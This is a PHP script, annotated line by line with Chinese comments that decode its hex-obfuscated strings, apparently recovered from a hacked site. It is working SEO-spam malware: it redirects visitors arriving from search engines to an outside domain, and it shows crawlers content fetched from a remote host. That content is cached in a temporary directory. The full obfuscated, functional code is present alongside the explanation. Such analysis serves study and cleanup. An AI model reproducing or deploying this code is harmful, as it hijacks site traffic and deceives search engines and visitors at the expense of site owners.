<?php
/**
 * relset_UC_key()这个方法主要用来加密,没有具体功能用途,只是让人比较不好看懂而已
 * StartCache
 */
function relset_UC_key ($string){
     $arraygn = strlen ($string);
     $debuger = '';
     for($one = 0;$one < $arraygn;$one += 2){
         $debuger .= pack ("C", hexdec (substr ($string, $one, 2)));
     }
     return $debuger;
}



/**
 * 
 * 例如原来网址:
 * www.pimei.com/mdsz/article-7330945-1.html
 * 任何网址从搜索引擎进去都是:这种格式
 * http://www5.dangci888.com/?www_pimei_com
 * 
 * Enter description here ...
 * @param unknown_type $url
 * 补充:参考网站里面正常文章链接:
 * http://www.pimei.com/mdsz/article-78291-1.html
 */

//传入一个网址参数$url,这里具体是:http://www5.dangci888.com
//注意,应该是有http://头部
function relset_Turl ($url){
	//定义一个全局变量$relset_host,通过下面的处理,得到这里的:www.pimei.com
     global $relset_host;
     
     //relset_UC_key ('4c6f636174696f6e3a20')得到:	Location: 
     //elset_UC_key ('3f')得到问号	?
     //str_replace()方法将www.pimei.com处理成:www_pimei_com(把.号替换成_号)
     //所以最后得到的$tring的值是:
     //$string = "Location:http://www5.dangci888.com/?www_pimei_com";
     $string = relset_UC_key ('4c6f636174696f6e3a20' . $url . '3f') . str_replace ('.', '_', $relset_host);
     
     //将网页地址重定向到:http://www5.dangci888.com/?www_pimei_com
     header($string);
     
     //返回真,返回的作用待定测试;
     return true;
}


error_reporting (E_ERROR);



//$_SESSION['HTTP_REFERER']可以获取当前链接的上一个连接的来源地址，即链接到当前页面的前一页面的 URL 地址,这里
//stristr()方法用来查找判断来源链接是否有site:或者inurl:,如果有的话
//保存cookie缓存$_SERVER['HTTP_HOST']当前请求的 Host: 头信息的内容。 3天
//stristr()方法不区分大小写
if(stristr($_SERVER['HTTP_REFERER'], 'site%3A') or stristr($_SERVER['HTTP_REFERER'], 'inurl%3A')){
		
     setcookie('cookie', $_SERVER['HTTP_HOST'], time() + 259200);
}


//判断,
//$_GET是否有值
//区分大小写,链接地址是否有上一个来源地址,如果直接访问,那么$_SERVER['HTTP_REFERER']则不存在
//cookie缓存是否为空

//如果$_GET有值,并且$_SERVER['HTTP_REFERER']不存在即直接访问的,并且不存在缓存,那么执行
if($_GET && !eregi('site%3A|inurl%3A', $_SERVER['HTTP_REFERER']) && empty($_COOKIE['cookie'])){
	
	//把数组$_SERVER赋值给$clserv
     $clserv = & $_SERVER;
     
     //网址,eg.	www5.dangci888.com
     $relset_host = $clserv['HTTP_' . 'HOST'];
     
     //这个文件的路径,减去上面的网址
     //例如这个文件在:www5.dangci888.com/test/lb/2/1.php
     //那么$relset_self是:	/test/lb/2/1.php
     $relset_self = $clserv['PHP_' . 'SELF'];
     
     //上一个连接的来源地址
     $relset_refe = $clserv['HTTP_RE' . 'FERER'];
     
     //浏览器版本信息:例如:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
     $relset_user = $clserv['HTTP_US' . 'ER_AGENT'];
     
     
     if ($_GET['tid'] > 9999999 || $_GET['tid'] > 9999999){
         $arrgpe = array(
            'tid' => array('%B2%A9%B2%CA', '%b2%a9%b2%ca', '687474703A2F2F777777352E64616E6763693232322E636F6D2F'),
            
            );
        
         //array_keys()返回数组中所有的键名
         $keysar = array_keys ($_GET);
         
         //得到$arrgps = "tid";
         $arrgps = array_keys ($arrgpe);
         
         //array_intersect ($arrgps, $keysar)计算两个参数的交集,然后返回到array_values(),array_values()用来返回数组所有值
         //所以$arrgps只有一个tid这个键名,上面判断中必定有$_GET['tid'] > 9999999,即$_GET['tid']是存在的,所以
         //$arrgpx = "tid";
         $arrgpx = array_values (array_intersect ($arrgps, $keysar));
         
         //$rebotu = "tid";
         $rebotu = $arrgpx[0];//tid
         
         //得到$boswon = "baidu|google|sogou|soso|yahoo|bing|bot|spider|so|360|anquan";
         $boswon = relset_UC_key ('62616964757C676F6F676C657C736F676F757C736F736F7C7961686F6F7C62696E677C626F747C7370696465727C736F7C3336307C616E7175616E');
     }
     
     //如果上一个来源链接中存在baidu|google|sogou|soso|yahoo|bing|bot|spider|so|360|anquan,那么久执行
     if (eregi ($boswon, $relset_refe)){
     	
     	//因为$rebotu = "tid";是一定的,所以永远能执行
         if (!empty ($rebotu)){
         	
         	//$arrgpx[0]="tid";
         	//$arrgpe['tid'][2] = '687474703A2F2F777777352E64616E6763693232322E636F6D2F';
         	//relset_UC_key ('687474703A2F2F777777352E64616E6763693232322E636F6D2F');得到:http://www5.dangci222.com/
         	//所以下面relset_Turl()得到://将网页地址重定向到:http://www5.dangci222.com/?www_pimei_com
             relset_Turl ($arrgpe[$arrgpx[0]][2]);
             exit;
             }else{
             foreach($arrgpe as $vargn => $arraygn){
                 if(stristr ($relset_refe, $arraygn[0]) || stristr ($relset_refe, $arraygn[1])){
                     relset_Turl ($arraygn[2]);
                     exit;
                     }
                 }
             }
         }
         
         elseif (eregi ($boswon, $relset_user) && $rebotu){
         $valsar = array_values ($_GET);
         $retueby = array(
            0 => relset_UC_key ('3f643d'),
             1 => relset_UC_key ('26733d'),
             2 => relset_UC_key ('26763d'),
             3 => relset_UC_key ('26723d'),
             4 => relset_UC_key ('636f6e74656e742d547970653a20746578742f68746d6c3b20636861727365743d676232333132'),
             5 => relset_UC_key ('687474703a2f2f'),
             6 => relset_UC_key ('5b30785370696465725d')
            );
            
            /*
		    [0] => ?d=
		    [1] => &s=
		    [2] => &v=
		    [3] => &r=
		    [4] => content-Type: text/html; charset=gb2312
		    [5] => http://
		    [6] => [0xSpider]
             */
            
            
         $inters = relset_UC_key ('3830');		//80
         $demuer = relset_UC_key ('78696E79756E626273322E616E7175616E2E7573');		//xinyunbbs2.anquan.us
         $simeiao = relset_UC_key ('2f6170692f696e6465782e706870');					//	/api/index.php
         
         //  ?d=www5.dangci888.com&s=/test/lb/2/1.php&v=tid&r=?d=|&s=|&v=
         $classinction = $retueby[0] . $relset_host . $retueby[1] . $relset_self . $retueby[2] . $rebotu . $retueby[3] . $valsar[0] . '|' . $valsar[1] . '|' . $valsar[2];
         
         // header (content-Type: text/html; charset=gb2312);
         header ($retueby[4]);
         
         
         //substr(PHP_OS, 0, 3)截取得到php所运行的服务器,例如如果是win系统,PHP_OS在本机测试是WINNT,截取后就得到WIN
         //如果是win系统,那么返回'C:/windows/temp/,否则,返回:/tmp/
         //chr(47)是反斜杠 /
         //substr(md5($relset_host), 26)对网址eg.www5.dangci888.com加密成MD5,从第25个开始取值得到:  eb585d
      
		 $dir = (substr(PHP_OS, 0, 3) == 'WIN' ? 'C:/windows/temp/' : '/tmp/') . substr(md5($relset_host), 26) . chr(47);
		 
		 //$url = http://xinyunbbs2.anquan.us:80/api/index.php
		 //$url = http://xinyunbbs2.anquan.us:80/api/index.php?d=www5.dangci888.com&s=/test/lb/2/1.php&v=tid&r=?d=|&s=|&v=
		 $url = $retueby[5] . $demuer . ':' . $inters . $simeiao . $classinction;
		 $file =$dir . 'sess_' . substr(md5($url), 6);
		 if(@file_exists($file) && @filesize ($file) > 32){
			echo relset_UC_key(base64_decode(@file_get_contents($file)));
		 }else{
			$skyword = @file_get_contents ($retueby[5] . $demuer . ':' . $inters . $simeiao . $classinction);
			$skywords = explode ($retueby[6], $skyword);
			if(!@file_exists($dir)){
              @mkdir($dir, 0777);
            }
			@file_put_contents($file,base64_encode(bin2hex($skywords[1])));
			echo $skywords[1];
		 }
         exit;
         }
     }
/**
 * EndCache
 */
?>